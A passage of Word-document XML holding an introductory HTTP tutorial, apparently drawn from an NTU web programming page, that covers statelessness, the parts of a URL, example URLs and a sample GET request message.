      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> information from the server (instead of server </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>pushes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>information</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> down to the client).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5827222" cy="1998303"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="95" name="Picture 95" descr="https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/images/H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tu.edu.sg/home/ehchua/programming/webprogramming/images/HTTP.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827424" cy="1998372"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="202"/>
        </w:numPr>
        <w:spacing w:before="72" w:after="72" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="432"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>HTTP is a stateless protocol. In other words, the current request does not know what has been done in the previous requests.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="202"/>
        </w:numPr>
        <w:spacing w:before="72" w:after="72" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="432"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP permits negotiating of data type and representation, so as to allow systems to be built independently of the data being transferred.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="202"/>
        </w:numPr>
        <w:spacing w:before="72" w:after="72" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="432"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Quoting from the RFC2616: "The Hypertext Transfer Protocol (HTTP) is an application-level protocol for distributed, collaborative, hypermedia information systems. It is a generic, stateless, protocol which can be used for many tasks beyond its use for hypertext, such as name servers and distributed object management systems, through extension of its request methods, error codes and headers."</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:spacing w:before="0" w:line="357" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Browser</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>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Whenever you issue a URL from your browser to get a web resource using HTTP, e.g. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>http://www.nowhere123.com/index.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>, the browser turns the URL into a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request message</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> and sends it to the HTTP server. The HTTP server interprets the request message, and returns you an appropriate response message, which is either the resource you requested or an error message. This process is illustrated below:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="6047710" cy="2215613"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="94" name="Picture 94" descr="https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/images/HTTP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ntu.edu.sg/home/ehchua/programming/webprogramming/images/HTTP_Steps.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050897" cy="2216781"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:spacing w:before="0" w:line="357" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Uniform Resource Locator (URL)</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A URL (Uniform Resource Locator) is used to uniquely identify a resource over the web. URL has the following syntax:</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C7E2FA"/>
        <w:spacing w:line="254" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>protocol</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>://</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>hostname</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>path-and-file-name</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There are 4 parts in a URL:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="203"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="600"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Protocol</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>: The application-level protocol used by the client and server, e.g., HTTP, FTP, and telnet.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="203"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="600"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Hostname</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>: The DNS domain name (e.g., </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>www.nowhere123.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>) or IP address (e.g., 192.128.1.2) of the server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="203"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="600"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>: The TCP port number that the server is listening for incoming requests from the clients.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="203"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="600"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Path-and-file-name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>: The name and location of the requested resource, under the server document base directory.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>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lastRenderedPageBreak/>
        <w:t>For example, in the URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>http://www.nowhere123.com/docs/index.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>, the communication protocol is HTTP; the hostname is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>www.nowhere123.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>. The port number was not specified in the URL, and takes on the default number, which is TCP port 80 for HTTP. The path and file name for the resource to be located is "</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/docs/index.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>".</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Other examples of URL are:</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ECF2DA"/>
        <w:spacing w:before="75" w:after="90" w:line="254" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>ftp://www.ftp.org/docs/test.txt</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ECF2DA"/>
        <w:spacing w:before="75" w:after="90" w:line="254" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>mailto:user@test101.com</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ECF2DA"/>
        <w:spacing w:before="75" w:after="90" w:line="254" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>news:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>soc.culture.Singapore</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ECF2DA"/>
        <w:spacing w:before="75" w:after="90" w:line="254" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>telnet://www.nowhere123.com/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:spacing w:before="0" w:line="357" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="0075A2"/>
          <w:spacing w:val="15"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>HTTP Protocol</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As mentioned, whenever you enter a URL in the address box of the browser, the browser translates the URL into a request message according to the specified protocol; and sends the request message to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>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For example, the browser translated the URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>http://www.nowhere123.com/doc/index.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> into the following request message:</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Style w:val="Strong"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/docs/index.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP/1.1</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 xml:space="preserve">Host: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>www.nowhere123.com</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Accept: image/gif, image/jpeg, */*</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Accept-Language: en-us</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 xml:space="preserve">Accept-Encoding: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>gzip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, deflate</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User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="12" w:space="2" w:color="F8FFFF"/>
          <w:left w:val="single" w:sz="12" w:space="8" w:color="F8FFFF"/>
          <w:bottom w:val="single" w:sz="12" w:space="2" w:color="F8FFFF"/>
          <w:right w:val="single" w:sz="12" w:space="8" w:color="F8FFFF"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="C4EEFF"/>
        <w:spacing w:line="254" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>blank</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> line)</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When this request message reaches the server, the server can take either one of these actions:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="204"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="600"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>The server interprets the request received, maps the request into a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> under the server's document directory, and returns the file requested to the client.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="204"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="600"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
